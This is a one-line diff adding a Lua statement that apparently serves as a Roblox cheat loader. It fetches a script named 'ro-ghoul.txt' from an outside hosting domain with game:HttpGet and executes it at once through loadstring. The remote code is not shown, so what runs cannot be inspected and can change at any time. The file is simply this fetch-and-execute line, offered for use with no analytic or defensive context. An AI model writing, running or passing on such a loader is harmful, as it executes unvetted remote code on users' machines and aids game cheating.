@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("http://hcbb.hostingerapp.com/ro-ghoul.txt"))()()
